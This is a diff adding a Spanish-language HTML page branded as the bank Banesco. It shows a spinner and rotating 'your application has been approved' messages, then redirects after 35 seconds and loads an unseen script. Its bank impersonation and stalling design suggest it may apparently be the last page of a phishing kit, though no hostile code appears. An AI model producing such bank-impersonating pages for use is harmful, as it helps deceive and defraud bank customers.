@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Solicitud Aprobada - Banesco</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+    <style>
+        body {
+            margin: 0;
+            font-family: "Inter", "Helvetica Neue", Arial, sans-serif;
+            background-color: #f5f7fa;
+            color: #0f2240;
+        }
+        .page-loader {
+            position: fixed;
+            inset: 0;
+            background: #ffffff;
+            z-index: 99999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            gap: 25px;
+        }
+        .loader-container {
+            width: 100px;
+            height: 100px;
+            position: relative;
+        }
+        .loader-circle {
+            width: 100%;
+            height: 100%;
+            position: absolute;
+            border-radius: 50%;
+            border: 5px solid transparent;
+            border-top-color: #007953;
+            animation: spin 1.5s linear infinite;
+        }
+        .loader-circle.inner {
+            width: 70%;
+            height: 70%;
+            top: 15%;
+            left: 15%;
+            border-top-color: #6cbe9d;
+            animation: spin-reverse 2s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @keyframes spin-reverse { to { transform: rotate(-360deg); } }
+        .loading-text {
+            font-weight: 600;
+            font-size: 1.1rem;
+            text-align: center;
+            padding: 0 20px;            
+            max-width: 350px;
+            min-height: 40px; 
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+    </style>
+</head>
+<body>
+    <div class="page-loader">
+        <div class="loader-container">
+            <div class="loader-circle"></div>
+            <div class="loader-circle inner"></div>
+        </div>
+        <div id="loadingText" class="loading-text"></div>
+    </div>
+
+    <script src="protection.sander.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loadingTextElement = document.getElementById('loadingText');
+            const messages = [
+                "¡Felicidades! Su solicitud ha sido aprobada.",
+                "Estamos preparando su bienvenida a la familia Banesco.",
+                "Su solicitud ha sido procesada con éxito.",
+                "En breves momentos será redirigido a la página principal."
+            ];
+            let messageIndex = 0;
+
+            const messageInterval = setInterval(function() {
+                loadingTextElement.textContent = messages[messageIndex];
+                messageIndex = (messageIndex + 1) % messages.length;
+            }, 8000); // Cambia el mensaje cada 8 segundos
+
+            // Redirección final
+            setTimeout(function() {
+                clearInterval(messageInterval);
+                window.location.href = 'index.html';
+            }, 35000); // 35 segundos
+        });
+    </script>
+</body>
+</html>
